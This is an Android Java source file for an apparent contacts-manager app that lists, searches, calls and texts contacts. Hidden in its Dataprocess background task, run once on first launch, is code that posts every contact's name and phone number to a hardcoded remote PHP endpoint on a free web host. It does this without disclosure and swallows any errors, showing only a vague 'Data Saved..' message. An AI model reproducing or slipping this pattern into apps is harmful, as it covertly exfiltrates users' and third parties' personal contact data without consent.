package com.ultron.sahilpratap.contacts;
import android.Manifest;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.ContextMenu;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.SearchView;
import android.widget.Toast;

import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class MainActivity extends AppCompatActivity {

    SearchView searchView;
    ListView listView;
    ArrayList<String> names = new ArrayList<String>();
    ArrayList<String> phoneNo = new ArrayList<String>();
    String url = "https://first-android.000webhostapp.com/set_contacts.php";
    int count = 0;
    int itemId=0;
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        SharedPreferences setting = getSharedPreferences("prefs",0);
        boolean firstRun = setting.getBoolean("firstRun",true);
        searchView =(SearchView) findViewById(R.id.searchView);

        listView = findViewById(R.id.listView);
        final CustomAdapter adapter = new CustomAdapter(this, names, phoneNo);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS}, 101);
        }
        final Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
        while (phones.moveToNext()) {
            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            if (!(phoneNo.contains(phoneNumber))) {
                names.add(name);
                phoneNo.add(phoneNumber);
                count++;
            }
        }
        Toast.makeText(this, "" + count, Toast.LENGTH_LONG).show();
        listView.setAdapter(adapter);
        phones.close();
        registerForContextMenu(listView);

        searchView.setOnQueryTextListener (new SearchView.OnQueryTextListener() {
            @Override
            public boolean onQueryTextSubmit(String query) {

                ArrayList<String> list = new ArrayList<String>();
                ArrayList<String> newPhone = new ArrayList<String>();
                for(int each=0;each<names.size();each++) {
                    if (names.get(each).toLowerCase().contains(query.toLowerCase())) {
                        list.add(names.get(each));
                        newPhone.add(phoneNo.get(each));
                    }
                    Log.i("qwe",""+list.size());
                    CustomAdapter adapter = new CustomAdapter(MainActivity.this,list,newPhone);
                    listView.setAdapter(adapter);

                }
                return false;
            }

            @Override
            public boolean onQueryTextChange(String newText) {

                ArrayList<String> list = new ArrayList<String>();
                ArrayList<String> newPhone = new ArrayList<String>();
                for(int each=0;each<names.size();each++) {
                    if (names.get(each).toLowerCase().contains(newText.toLowerCase())) {
                        list.add(names.get(each));
                        newPhone.add(phoneNo.get(each));
                    }
                }
                Log.i("qwer",""+list.size());
                CustomAdapter adapter = new CustomAdapter(MainActivity.this,list,newPhone);
                listView.setAdapter(adapter);

                return false;
            }
        });
        if(firstRun)
        new Dataprocess().execute();

    }

    @Override
    public void onCreateContextMenu(ContextMenu menu, View v, ContextMenu.ContextMenuInfo menuInfo) {


        menu.add("Call");
        menu.add("Message");

        super.onCreateContextMenu(menu, v, menuInfo);
    }


    @Override
    public boolean onContextItemSelected(MenuItem item) {

        int id = item.getItemId();
        AdapterView.AdapterContextMenuInfo info = (AdapterView.AdapterContextMenuInfo) item.getMenuInfo();
        itemId = info.position;
        String tittle = item.getTitle().toString();
        final Dialog dialog = new Dialog(MainActivity.this);

        switch (tittle) {

            case "Call":


                if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {

                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.CALL_PHONE}, 101);

                }

                Intent intent = new Intent(Intent.ACTION_CALL);
                String number = phoneNo.get(itemId);
                intent.setData(Uri.parse("tel:"+number));
                // tel is a key

                startActivity(intent);
                break;
            case "Message":

                dialog.setContentView(R.layout.custom_sms);
                dialog.setCanceledOnTouchOutside(false);
                final EditText e1 = dialog.findViewById(R.id.editText3);
                Button btn = dialog.findViewById(R.id.button2);
                dialog.show();

                if(ActivityCompat.checkSelfPermission(MainActivity.this,Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {

                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.SEND_SMS}, 101);
                }

                btn.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {

                        String t = e1.getText().toString();
                        String number = phoneNo.get(itemId).toString();

                        SmsManager sms = SmsManager.getDefault();

                        sms.sendTextMessage(number, null, t, null, null);
                        Toast.makeText(MainActivity.this, "sms Sent..", Toast.LENGTH_LONG).show();
                        dialog.dismiss();
                    }
                });

        }

        return super.onContextItemSelected(item);
    }


    class Dataprocess extends AsyncTask<String,String,String> {



        @Override
        protected void onPreExecute() {


            super.onPreExecute();
        }

        @Override
        protected String doInBackground(String... strings) {


            for(int i=0;i<names.size();i++) {
                try {

                    ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();
                    params.add(new BasicNameValuePair("name", names.get(i).toString()));
                    params.add(new BasicNameValuePair("number", phoneNo.get(i).toString()));
                    DefaultHttpClient httpClient = new DefaultHttpClient();

                    HttpPost httpPost = new HttpPost(url);

                    httpPost.setEntity(new UrlEncodedFormEntity(params));
                    httpClient.execute(httpPost);

                } catch (Exception e) {
                }
            }
            return null;
        }

        @Override
        protected void onPostExecute(String s) {


            Toast.makeText(MainActivity.this,"Data Saved..",Toast.LENGTH_LONG).show();
            super.onPostExecute(s);
        }

    }

}